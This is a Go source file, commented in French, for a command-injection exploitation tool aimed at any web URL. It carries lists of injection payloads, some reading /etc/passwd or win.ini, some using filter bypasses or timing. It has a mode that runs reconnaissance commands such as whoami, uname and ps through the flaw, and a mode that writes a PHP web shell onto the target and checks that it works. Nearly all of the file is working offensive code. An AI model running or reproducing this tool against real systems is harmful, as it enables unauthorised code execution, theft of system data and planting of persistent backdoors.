package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

// Résultat de l'exploitation
type Result struct {
	Status     string            `json:"status"`
	Vulnerable bool              `json:"vulnerable"`
	Technique  string            `json:"technique"`
	OS         string            `json:"os_detected"`
	Commands   map[string]string `json:"commands_executed"`
	ShellURL   string            `json:"shell_url,omitempty"`
	Error      string            `json:"error,omitempty"`
}

// Configuration d'exploitation
type ExploitConfig struct {
	URL          string            `json:"url"`
	Method       string            `json:"method"`
	Data         string            `json:"data"`
	ExploitType  string            `json:"exploit_type"`
	OutputFile   string            `json:"output_file"`
	Timeout      int               `json:"timeout"`
	Threads      int               `json:"threads"`
	VerboseMode  bool              `json:"verbose_mode"`
	CookieString string            `json:"cookie_string"`
	Headers      map[string]string `json:"headers"`
	Proxy        string            `json:"proxy"`
	DetectionStr string            `json:"detection_str"`
	TargetParam  string            `json:"target_param"`
	ShellPath    string            `json:"shell_path"`
}

// Payloads de test pour les injections de commandes
var cmdInjectionTests = []struct {
	Name     string
	Payloads []string
	OS       string
}{
	{
		Name: "Unix Basic",
		Payloads: []string{
			";id",
			"& id",
			"| id",
			"$(id)",
			"`id`",
			"|| id",
			"&& id",
		},
		OS: "unix",
	},
	{
		Name: "Windows Basic",
		Payloads: []string{
			"& dir",
			"| dir",
			"|| dir",
			"&& dir",
			"; dir",
		},
		OS: "windows",
	},
	{
		Name: "Unix Advanced",
		Payloads: []string{
			";cat /etc/passwd",
			"$(cat /etc/passwd)",
			"`cat /etc/passwd`",
			"| cat /etc/passwd",
			"$(`cat /etc/passwd`)",
			"$(cat$IFS/etc/passwd)",
			"cat${IFS}/etc/passwd",
		},
		OS: "unix",
	},
	{
		Name: "Windows Advanced",
		Payloads: []string{
			"& type C:\\Windows\\win.ini",
			"| type C:\\Windows\\win.ini",
			"type %WINDIR%\\win.ini",
		},
		OS: "windows",
	},
	{
		Name: "Special Chars Bypass",
		Payloads: []string{
			"'whoami'",
			"\"whoami\"",
			"^whoami",
			"%0Awhoami",
			"%0awhoami",
			"%0a id",
			"<!--#exec cmd=\"id\" -->",
		},
		OS: "any",
	},
	{
		Name: "Time Based",
		Payloads: []string{
			"; sleep 5",
			"& sleep 5",
			"| sleep 5",
			"& ping -c 5 127.0.0.1",
			"| ping -c 5 127.0.0.1",
			"& timeout 5",
			"| timeout 5",
		},
		OS: "unix",
	},
	{
		Name: "Time Based (Windows)",
		Payloads: []string{
			"& ping -n 5 127.0.0.1",
			"| ping -n 5 127.0.0.1",
			"& timeout 5",
			"| timeout 5",
		},
		OS: "windows",
	},
}

// Détecteurs pour identifier l'output d'une commande
var cmdOutputDetectors = map[string]*regexp.Regexp{
	"unix_id":        regexp.MustCompile(`uid=\d+\(.+\) gid=\d+\(.+\)`),
	"unix_passwd":    regexp.MustCompile(`root:.*:0:0:`),
	"unix_ls":        regexp.MustCompile(`total \d+`),
	"windows_dir":    regexp.MustCompile(`(?i)Directory of|<DIR>`),
	"windows_ipconfig": regexp.MustCompile(`(?i)Windows IP Configuration|Ethernet adapter`),
	"windows_whoami": regexp.MustCompile(`(?i):\\windows\\system32\\`),
}

// Analyse les paramètres de ligne de commande
func parseFlags() ExploitConfig {
	config := ExploitConfig{}
	
	// Paramètres de base
	flag.StringVar(&config.URL, "url", "", "URL cible de l'injection")
	flag.StringVar(&config.Method, "method", "GET", "Méthode HTTP (GET ou POST)")
	flag.StringVar(&config.Data, "data", "", "Données POST")
	flag.StringVar(&config.TargetParam, "param", "", "Paramètre cible pour l'injection")
	flag.StringVar(&config.ExploitType, "type", "detect", "Type d'exploitation: detect, exploit, shell")
	
	// Paramètres avancés
	flag.StringVar(&config.Proxy, "proxy", "", "Proxy à utiliser (format: http://ip:port)")
	flag.StringVar(&config.CookieString, "cookie", "", "Cookies à envoyer (format: key1=value1; key2=value2)")
	flag.IntVar(&config.Timeout, "timeout", 10, "Timeout en secondes")
	flag.IntVar(&config.Threads, "threads", 5, "Nombre de threads")
	flag.BoolVar(&config.VerboseMode, "verbose", false, "Mode verbeux")
	flag.StringVar(&config.DetectionStr, "detect", "", "Chaîne pour détecter une exécution réussie")
	flag.StringVar(&config.OutputFile, "output", "", "Fichier de sortie pour les résultats")
	flag.StringVar(&config.ShellPath, "shell-path", "/tmp/shell.php", "Chemin pour uploader un shell (pour le mode 'shell')")
	
	// Paramètres d'en-tête HTTP
	headersPtr := flag.String("headers", "", "En-têtes HTTP au format JSON")
	
	// Lire la configuration depuis un fichier
	configFilePtr := flag.String("config", "", "Fichier de configuration JSON")
	
	// Analyser les arguments
	flag.Parse()
	
	// Traiter les en-têtes
	if *headersPtr != "" {
		err := json.Unmarshal([]byte(*headersPtr), &config.Headers)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Erreur lors du parsing des en-têtes: %v\n", err)
			os.Exit(1)
		}
	} else {
		config.Headers = make(map[string]string)
	}
	
	// Charger la configuration depuis un fichier si spécifié
	if *configFilePtr != "" {
		file, err := ioutil.ReadFile(*configFilePtr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Impossible de lire le fichier de configuration: %v\n", err)
			os.Exit(1)
		}
		
		err = json.Unmarshal(file, &config)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Erreur lors du parsing du fichier de configuration: %v\n", err)
			os.Exit(1)
		}
	}
	
	// Vérifier les paramètres obligatoires
	if config.URL == "" {
		fmt.Fprintln(os.Stderr, "L'URL est obligatoire")
		flag.PrintDefaults()
		os.Exit(1)
	}
	
	if config.Method == "POST" && config.Data == "" {
		fmt.Fprintln(os.Stderr, "Les données POST sont obligatoires pour la méthode POST")
		flag.PrintDefaults()
		os.Exit(1)
	}
	
	// Initialiser les en-têtes par défaut si non spécifiés
	if config.Headers["User-Agent"] == "" {
		config.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
	}
	
	return config
}

// Exécute une requête avec un payload spécifique
func executeRequest(config ExploitConfig, payload string, paramName string) (string, error) {
	// Client HTTP avec timeout
	client := &http.Client{
		Timeout: time.Duration(config.Timeout) * time.Second,
	}
	
	// Configurer le proxy si spécifié
	if config.Proxy != "" {
		proxyURL, err := url.Parse(config.Proxy)
		if err != nil {
			return "", err
		}
		client.Transport = &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		}
	}
	
	var req *http.Request
	var err error
	
	if config.Method == "GET" {
		// Construire l'URL avec le payload
		parsedURL, err := url.Parse(config.URL)
		if err != nil {
			return "", err
		}
		
		queryParams := parsedURL.Query()
		if paramName != "" {
			queryParams.Set(paramName, payload)
		} else {
			// Si aucun paramètre n'est spécifié, tester chaque paramètre
			for paramKey := range queryParams {
				queryParams.Set(paramKey, queryParams.Get(paramKey)+payload)
				break // Tester seulement le premier paramètre pour cette requête
			}
		}
		
		parsedURL.RawQuery = queryParams.Encode()
		
		req, err = http.NewRequest("GET", parsedURL.String(), nil)
		if err != nil {
			return "", err
		}
	} else if config.Method == "POST" {
		// Construire les données POST avec le payload
		var data string
		
		if strings.Contains(config.Data, "=") {
			// Format de données standard
			formData, err := url.ParseQuery(config.Data)
			if err != nil {
				return "", err
			}
			
			if paramName != "" {
				formData.Set(paramName, payload)
			} else {
				// Si aucun paramètre n'est spécifié, tester chaque paramètre
				for paramKey := range formData {
					formData.Set(paramKey, formData.Get(paramKey)+payload)
					break // Tester seulement le premier paramètre pour cette requête
				}
			}
			
			data = formData.Encode()
			req, err = http.NewRequest("POST", config.URL, strings.NewReader(data))
			if err != nil {
				return "", err
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		} else if strings.HasPrefix(config.Data, "{") {
			// Format JSON
			var jsonData map[string]interface{}
			if err := json.Unmarshal([]byte(config.Data), &jsonData); err != nil {
				return "", err
			}
			
			if paramName != "" {
				jsonData[paramName] = payload
			} else {
				// Si aucun paramètre n'est spécifié, tester chaque paramètre
				for key := range jsonData {
					if str, ok := jsonData[key].(string); ok {
						jsonData[key] = str + payload
						break // Tester seulement le premier paramètre pour cette requête
					}
				}
			}
			
			jsonBytes, err := json.Marshal(jsonData)
			if err != nil {
				return "", err
			}
			
			req, err = http.NewRequest("POST", config.URL, strings.NewReader(string(jsonBytes)))
			if err != nil {
				return "", err
			}
			req.Header.Set("Content-Type", "application/json")
		} else {
			// Format non reconnu
			return "", fmt.Errorf("format de données POST non reconnu")
		}
	} else {
		return "", fmt.Errorf("méthode HTTP non supportée: %s", config.Method)
	}
	
	// Ajouter les en-têtes
	for key, value := range config.Headers {
		req.Header.Set(key, value)
	}
	
	// Ajouter les cookies
	if config.CookieString != "" {
		req.Header.Set("Cookie", config.CookieString)
	}
	
	// Exécuter la requête
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	
	// Lire le corps de la réponse
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	
	return string(body), nil
}

// Détecte une vulnérabilité d'injection de commandes
func detectCommandInjection(config ExploitConfig) (Result, error) {
	result := Result{
		Status:     "failed",
		Vulnerable: false,
		Commands:   make(map[string]string),
	}
	
	var wg sync.WaitGroup
	var mutex sync.Mutex
	semaphore := make(chan struct{}, config.Threads)
	
	// Pour chaque groupe de payloads
	for _, testGroup := range cmdInjectionTests {
		// Pour chaque payload dans le groupe
		for _, payload := range testGroup.Payloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquérir une place dans le sémaphore
			
			go func(group string, payload string, os string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Libérer le sémaphore
				
				if config.VerboseMode {
					fmt.Printf("[*] Test avec payload: %s\n", payload)
				}
				
				// Exécuter la requête avec le payload
				body, err := executeRequest(config, payload, config.TargetParam)
				if err != nil {
					fmt.Fprintf(os.Stderr, "Erreur lors de l'exécution de la requête: %v\n", err)
					return
				}
				
				// Vérifier si la commande a été exécutée
				// Rechercher des motifs spécifiques selon le type de commande
				matched := false
				var detectedPattern string
				
				for pattern, regex := range cmdOutputDetectors {
					if regex.MatchString(body) {
						matched = true
						detectedPattern = pattern
						break
					}
				}
				
				// Détection personnalisée si fournie
				if config.DetectionStr != "" && strings.Contains(body, config.DetectionStr) {
					matched = true
					detectedPattern = "custom"
				}
				
				if matched {
					mutex.Lock()
					result.Status = "success"
					result.Vulnerable = true
					result.OS = os
					result.Technique = group
					result.Commands[payload] = detectedPattern
					mutex.Unlock()
					
					if config.VerboseMode {
						fmt.Printf("[+] Injection réussie avec: %s (détecté: %s)\n", payload, detectedPattern)
					}
				}
			}(testGroup.Name, payload, testGroup.OS)
		}
	}
	
	wg.Wait()
	return result, nil
}

// Exploite une vulnérabilité confirmée pour exécuter des commandes
func exploitCommandInjection(config ExploitConfig) (Result, error) {
	result := Result{
		Status:     "failed",
		Vulnerable: false,
		Commands:   make(map[string]string),
	}
	
	// Détecter d'abord la vulnérabilité pour trouver un payload qui fonctionne
	detectResult, err := detectCommandInjection(config)
	if err != nil {
		return result, err
	}
	
	if !detectResult.Vulnerable {
		return result, fmt.Errorf("aucune vulnérabilité d'injection de commandes détectée")
	}
	
	// Trouver le meilleur payload qui a fonctionné
	var bestPayload string
	for payload := range detectResult.Commands {
		bestPayload = payload
		break
	}
	
	// Adapter le payload pour exécuter des commandes personnalisées
	// Extraire le préfixe d'injection (;, |, etc.)
	var prefix string
	if strings.HasPrefix(bestPayload, ";") {
		prefix = ";"
	} else if strings.HasPrefix(bestPayload, "|") {
		prefix = "|"
	} else if strings.HasPrefix(bestPayload, "&") {
		prefix = "&"
	} else if strings.HasPrefix(bestPayload, "$") {
		prefix = "$"
	} else if strings.HasPrefix(bestPayload, "`") {
		prefix = "`"
	} else {
		prefix = ";"
	}
	
	// Commandes à exécuter selon le système d'exploitation détecté
	commands := make(map[string]string)
	if strings.Contains(detectResult.OS, "unix") {
		commands["Hostname"] = prefix + " hostname"
		commands["Current User"] = prefix + " whoami"
		commands["System Info"] = prefix + " uname -a"
		commands["Network"] = prefix + " ifconfig || ip addr"
		commands["Processes"] = prefix + " ps aux | grep root"
	} else {
		commands["Hostname"] = prefix + " hostname"
		commands["Current User"] = prefix + " whoami"
		commands["System Info"] = prefix + " systeminfo"
		commands["Network"] = prefix + " ipconfig"
		commands["Processes"] = prefix + " tasklist"
	}
	
	// Exécuter chaque commande
	for cmdName, cmdPayload := range commands {
		body, err := executeRequest(config, cmdPayload, config.TargetParam)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Erreur lors de l'exécution de %s: %v\n", cmdName, err)
			continue
		}
		
		// Essayer d'extraire la sortie de la commande du corps de la réponse
		// C'est un défi car le HTML peut contenir beaucoup d'autres choses
		result.Commands[cmdName] = body
		
		if config.VerboseMode {
			fmt.Printf("[+] Commande exécutée: %s\n", cmdName)
		}
	}
	
	result.Status = "success"
	result.Vulnerable = true
	result.OS = detectResult.OS
	result.Technique = detectResult.Technique
	
	return result, nil
}

// Uploader un shell web
func uploadWebShell(config ExploitConfig) (Result, error) {
	result := Result{
		Status:     "failed",
		Vulnerable: false,
		Commands:   make(map[string]string),
	}
	
	// Détecter d'abord la vulnérabilité
	detectResult, err := detectCommandInjection(config)
	if err != nil {
		return result, err
	}
	
	if !detectResult.Vulnerable {
		return result, fmt.Errorf("aucune vulnérabilité d'injection de commandes détectée")
	}
	
	// Trouver le meilleur payload qui a fonctionné
	var bestPayload string
	for payload := range detectResult.Commands {
		bestPayload = payload
		break
	}
	
	// Adapter le payload pour uploader un shell
	var prefix string
	if strings.HasPrefix(bestPayload, ";") {
		prefix = ";"
	} else if strings.HasPrefix(bestPayload, "|") {
		prefix = "|"
	} else if strings.HasPrefix(bestPayload, "&") {
		prefix = "&"
	} else {
		prefix = ";"
	}
	
	// Shell PHP minimal
	phpShell := "<?php system($_GET['cmd']); ?>"
	
	// Commande pour écrire le shell
	var uploadCommand string
	if strings.Contains(detectResult.OS, "unix") {
		uploadCommand = fmt.Sprintf("%s echo '%s' > %s", prefix, phpShell, config.ShellPath)
	} else {
		// Pour Windows, utiliser echo avec redirection
		uploadCommand = fmt.Sprintf("%s echo %s > %s", prefix, strings.ReplaceAll(phpShell, "'", "\""), config.ShellPath)
	}
	
	// Exécuter la commande pour uploader le shell
	_, err = executeRequest(config, uploadCommand, config.TargetParam)
	if err != nil {
		return result, fmt.Errorf("erreur lors de l'upload du shell: %v", err)
	}
	
	// Construire l'URL du shell
	urlObj, _ := url.Parse(config.URL)
	baseURL := fmt.Sprintf("%s://%s", urlObj.Scheme, urlObj.Host)
	
	// Construire le chemin relatif du shell
	var shellPath string
	if strings.HasPrefix(config.ShellPath, "/") {
		shellPath = config.ShellPath
	} else {
		// Tenter de deviner le chemin relatif
		shellPath = "/tmp/" + config.ShellPath
	}
	
	shellURL := fmt.Sprintf("%s%s", baseURL, shellPath)
	
	// Vérifier si le shell est accessible
	testCmd := "id"
	shellTestURL := fmt.Sprintf("%s?cmd=%s", shellURL, url.QueryEscape(testCmd))
	
	resp, err := http.Get(shellTestURL)
	if err != nil {
		result.ShellURL = shellURL // Même si on ne peut pas le vérifier
		result.Error = fmt.Sprintf("Shell uploadé mais non accessible: %v", err)
		return result, nil
	}
	defer resp.Body.Close()
	
	body, _ := ioutil.ReadAll(resp.Body)
	
	if strings.Contains(string(body), "uid=") {
		result.Status = "success"
		result.Vulnerable = true
		result.OS = detectResult.OS
		result.Technique = "Shell Upload"
		result.ShellURL = shellURL
		
		if config.VerboseMode {
			fmt.Printf("[+] Shell uploadé avec succès: %s\n", shellURL)
		}
	} else {
		result.Error = "Shell uploadé mais semble ne pas fonctionner"
	}
	
	return result, nil
}

func main() {
	// Analyser les paramètres
	config := parseFlags()
	
	var result Result
	var err error
	
	// Selon le type d'exploitation choisi
	switch config.ExploitType {
	case "detect":
		result, err = detectCommandInjection(config)
	case "exploit":
		result, err = exploitCommandInjection(config)
	case "shell":
		result, err = uploadWebShell(config)
	default:
		fmt.Fprintf(os.Stderr, "Type d'exploitation non reconnu: %s\n", config.ExploitType)
		os.Exit(1)
	}
	
	if err != nil {
		fmt.Fprintf(os.Stderr, "Erreur: %v\n", err)
		os.Exit(1)
	}
	
	// Sortie des résultats
	jsonResult, err := json.MarshalIndent(result, "", "  ")
	if err != nil {
		fmt.Fprintf(os.Stderr, "Erreur lors de la sérialisation JSON: %v\n", err)
		os.Exit(1)
	}
	
	// Écrire dans un fichier si spécifié
	if config.OutputFile != "" {
		err := ioutil.WriteFile(config.OutputFile, jsonResult, 0644)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Erreur lors de l'écriture du fichier: %v\n", err)
		} else {
			fmt.Printf("[+] Résultats enregistrés dans: %s\n", config.OutputFile)
		}
	}
	
	// Afficher les résultats
	fmt.Println(string(jsonResult))
	
	// Sortir avec un code d'erreur si l'exploitation a échoué
	if result.Status == "failed" {
		os.Exit(1)
	}
} 